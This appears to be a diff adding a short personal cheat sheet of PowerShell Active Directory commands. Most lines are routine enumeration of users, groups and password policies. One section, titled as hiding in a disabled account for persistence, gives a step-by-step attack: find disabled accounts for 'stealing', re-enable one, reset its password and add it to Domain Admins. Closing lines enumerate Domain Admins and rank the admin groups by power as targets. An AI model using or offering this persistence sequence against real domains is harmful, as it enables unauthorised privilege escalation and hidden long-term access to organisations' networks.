@@ -1,0 +1,27 @@
+gcm -Module ActiveDirectory                                         : list all of the active directory commands
+get-addomain                                                        : get the current domain information on the AD
+get-adgroup                                                         : list out all of the groups on the domain
+get-adgroupmember -Identity <grp>                                   : get a list of all the members of a given group
+get-windowsfeature                                                  : see all of the installed modules/features
+get-adgroupmember -identity <grp> -recursive | select -property *   : get all of the information for each user in a group
+get-aduser -filter *                                                : get info of a user on the domain
+get-aduser -identity "user.name" -properties *                      : get all info about the user on a domain 
+get-addefaultdomainpasswordpolicy                                   : get the password policy of the domain
+get-adfinegrainedpasswordpolicy -filter {Name -like "*"}            : get detailed information on a password policy for a user(?)
+
+
+
+--Hiding as a disabled user account for persistence--
+get-aduser -filter {Enabled -eq "FALSE"} -properties name, enabled  : get a list of disabled accounts on the domain. useful for stealing accounts
+enable-adaccount -identity <disabledacc>                            : enable the disabled account
+set-adaccountpassword -identity <disabedacc> -newpassword (convertto-securestring -asplaintext -string "mynewpassword") : set a new password
+add-adgroupmember -identity "domain admins" -members <disabledacc>  : add the disabled account to the domain admins
+
+
+--Making A New User--
+get-aduser -filter * | select distinguishedname nameofacc
+
+--Enumerating Users From A Group--
+get-adgroupmember -identity "Domain Admins" -recursive | foreach {get-aduser -identity $_.distinguishedname} | select name,enabled
+
+typical administrative accounts (in order of power): Enterprise Admins, Domain Admins, Sys Admins LV1/LV2
